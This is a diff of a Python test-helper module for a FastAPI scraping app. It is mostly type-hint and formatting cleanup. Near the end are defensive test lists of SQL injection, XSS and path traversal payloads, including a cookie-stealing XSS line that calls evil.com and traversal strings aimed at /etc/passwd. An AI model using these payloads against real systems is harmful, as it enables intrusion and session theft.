@@ -2,18 +2,16 @@
 
 import asyncio
 import time
-from pathlib import Path
-from typing import Any, Callable, Dict, List, Optional, Tuple, Union
+from collections.abc import Callable
+from typing import Any, Optional
 from unittest.mock import AsyncMock
 
-import pytest
 from fastapi.testclient import TestClient
-from httpx import ASGITransport, AsyncClient
+from httpx import AsyncClient
 from sqlalchemy import event, func, select
 from sqlalchemy.orm import Session
 
-from app.database.models import Base, Company, ScrapingJob, Source, User
-
+from app.database.models import Base, Company, ScrapingJob, Source
 
 # E2E / Scraper Helpers
 
@@ -47,9 +45,7 @@ def assert_company_in_database(
     """Assert a company exists in DB with expected field values."""
 
     company = (
-        db.query(Company)
-        .filter(Company.company_name == company_name, Company.city == city)
-        .first()
+        db.query(Company).filter(Company.company_name == company_name, Company.city == city).first()
     )
     assert company is not None, f"Company '{company_name}' in '{city}' not found"
 
@@ -93,10 +89,12 @@ def create_test_scraping_job_with_source(
 
 # Response Validation Helpers
 
+
 def assert_response_time(response, max_ms: int) -> None:
     """Assert that the response time is less than max_ms."""
     elapsed_ms = response.elapsed.total_seconds() * 1000
     assert elapsed_ms < max_ms, f"Response time {elapsed_ms:.2f}ms exceeds {max_ms}ms"
+
 
 def assert_pagination_response(response, expected_total: Optional[int] = None) -> None:
     """Validate pagination response format."""
@@ -106,9 +104,10 @@ def assert_pagination_response(response, expected_total: Optional[int] = None) -
     assert "limit" in data
     assert "items" in data
     assert isinstance(data["items"], list)
-    
+
     if expected_total is not None:
         assert data["total"] == expected_total
+
 
 def assert_error_response(response, status_code: int, error_message: Optional[str] = None) -> None:
     """Assert that the response is an error with the given status code and optional message."""
@@ -116,13 +115,16 @@ def assert_error_response(response, status_code: int, error_message: Optional[st
     if error_message:
         assert error_message.lower() in response.text.lower()
 
+
 # Test Data Creation Helpers
 
-def create_test_companies_bulk(db: Session, count: int, **overrides) -> List[Company]:
+
+def create_test_companies_bulk(db: Session, count: int, **overrides) -> list[Company]:
     """Create multiple test companies with optional overrides."""
     from faker import Faker
+
     fake = Faker()
-    
+
     companies = []
     for i in range(count):
         company_data = {
@@ -131,16 +133,17 @@ def create_test_companies_bulk(db: Session, count: int, **overrides) -> List[Com
             "industry": fake.job(),
             "website": f"https://{fake.domain_name()}",
             "description": fake.paragraph(),
-            **overrides
+            **overrides,
         }
         company = Company(**company_data)
         db.add(company)
         companies.append(company)
-    
+
     db.commit()
     return companies
 
-def create_test_scraping_jobs_bulk(db: Session, count: int, **overrides) -> List[ScrapingJob]:
+
+def create_test_scraping_jobs_bulk(db: Session, count: int, **overrides) -> list[ScrapingJob]:
     """Create multiple test scraping jobs with optional overrides."""
     from faker import Faker
 
@@ -173,7 +176,7 @@ def create_test_scraping_jobs_bulk(db: Session, count: int, **overrides) -> List
             db.flush()
             resolved_source_id = generated_source.id
 
-    jobs: List[ScrapingJob] = []
+    jobs: list[ScrapingJob] = []
     for i in range(count):
         job_data = job_kwargs.copy()
         job_data.setdefault("job_name", f"scrape-job-{i}")
@@ -194,24 +197,22 @@ def create_test_scraping_jobs_bulk(db: Session, count: int, **overrides) -> List
 
     return jobs
 
+
 # Async Test Helpers
 
+
 async def simulate_concurrent_requests(
-    client, 
-    endpoint: str, 
-    count: int, 
-    method: str = 'GET', 
-    **kwargs
-) -> List[Any]:
+    client, endpoint: str, count: int, method: str = "GET", **kwargs
+) -> list[Any]:
     """Simulate multiple concurrent requests to an endpoint.
-    
+
     Args:
         client: Either a TestClient or AsyncClient instance
         endpoint: The API endpoint to call
         count: Number of concurrent requests to make
         method: HTTP method (GET, POST, PUT, DELETE)
         **kwargs: Additional arguments to pass to the request
-        
+
     Returns:
         List of responses from the concurrent requests
     """
@@ -240,9 +241,9 @@ def wait_for_scraping_job_completion(
     client: TestClient,
     job_id: int,
     timeout: int = 30,
-    auth_headers: Optional[Dict[str, str]] = None,
+    auth_headers: Optional[dict[str, str]] = None,
     poll_interval: float = 0.5,
-) -> Dict[str, Any]:
+) -> dict[str, Any]:
     """Poll scraping job endpoint until the job completes or fails."""
 
     deadline = time.time() + timeout
@@ -253,7 +254,7 @@ def wait_for_scraping_job_completion(
         last_response = client.get(f"/api/v1/scraping/jobs/{job_id}", headers=headers)
 
         if last_response.status_code == 200:
-            job_data: Dict[str, Any] = last_response.json()
+            job_data: dict[str, Any] = last_response.json()
             status = job_data.get("status")
             if status in {"completed", "failed", "cancelled"}:
                 return job_data
@@ -273,9 +274,9 @@ async def wait_for_scraping_job_completion_async(
     client: AsyncClient,
     job_id: int,
     timeout: int = 30,
-    auth_headers: Optional[Dict[str, str]] = None,
+    auth_headers: Optional[dict[str, str]] = None,
     poll_interval: float = 0.5,
-) -> Dict[str, Any]:
+) -> dict[str, Any]:
     """Async variant of wait_for_scraping_job_completion for httpx.AsyncClient."""
 
     deadline = time.time() + timeout
@@ -283,12 +284,10 @@ async def wait_for_scraping_job_completion_async(
 
     last_response = None
     while time.time() < deadline:
-        last_response = await client.get(
-            f"/api/v1/scraping/jobs/{job_id}", headers=headers
-        )
+        last_response = await client.get(f"/api/v1/scraping/jobs/{job_id}", headers=headers)
 
         if last_response.status_code == 200:
-            job_data: Dict[str, Any] = last_response.json()
+            job_data: dict[str, Any] = last_response.json()
             status = job_data.get("status")
             if status in {"completed", "failed", "cancelled"}:
                 return job_data
@@ -303,7 +302,9 @@ async def wait_for_scraping_job_completion_async(
         f"Last response status={last_response.status_code}, body={last_response.text}"
     )
 
+
 # Database Test Helpers
+
 
 class _QueryCounter:
     """Context manager that counts SQL queries executed within its scope."""
@@ -341,8 +342,8 @@ class _RollbackTriggered(RuntimeError):
     """Internal exception used to enforce rollback in nested transactions."""
 
 
-def _snapshot_row_counts(db: Session) -> Dict[str, int]:
-    counts: Dict[str, int] = {}
+def _snapshot_row_counts(db: Session) -> dict[str, int]:
+    counts: dict[str, int] = {}
     for mapper in Base.registry.mappers:
         model = mapper.class_
         counts[model.__name__] = db.execute(select(func.count()).select_from(model)).scalar_one()
@@ -370,9 +371,11 @@ def assert_database_transaction_rollback(db: Session, operation: Callable[[Sessi
         baseline_counts == post_counts
     ), "Database state changed despite rollback enforcement in test helper."
 
+
 # Security Test Helpers
 
-def generate_sql_injection_payloads() -> List[str]:
+
+def generate_sql_injection_payloads() -> list[str]:
     """Generate a list of SQL injection test payloads."""
     return [
         "' OR '1'='1",
@@ -394,7 +397,8 @@ def generate_sql_injection_payloads() -> List[str]:
         "' OR '1'='1' /*",
     ]
 
-def generate_xss_payloads() -> List[str]:
+
+def generate_xss_payloads() -> list[str]:
     """Generate a list of XSS test payloads."""
     return [
         "<script>alert('XSS')</script>",
@@ -409,17 +413,18 @@ def generate_xss_payloads() -> List[str]:
         "<img src=x onerror=this.src='http://evil.com/?c='+document.cookie>",
     ]
 
-def generate_path_traversal_payloads() -> List[str]:
+
+def generate_path_traversal_payloads() -> list[str]:
     """Generate a list of path traversal test payloads."""
     return [
         "../../../etc/passwd",
         "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
         "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-        "..%5c..%5c..\windows\win.ini",
+        r"..%5c..%5c..\windows\win.ini",
         "..%2f..%2f..%2fetc%2fpasswd%00.jpg",
-        "..\..\..\..\..\..\..\..\..\..\etc\passwd",
+        r"..\..\..\..\..\..\..\..\..\..\etc\passwd",
         "....//....//etc/passwd",
-        "..\\.\..\\.\..\etc\passwd",
+        "..\\.\\..\\.\\..\\etc\\passwd",
         "/etc/passwd",
         "C:\\Windows\\System32\\drivers\\etc\\hosts",
     ]
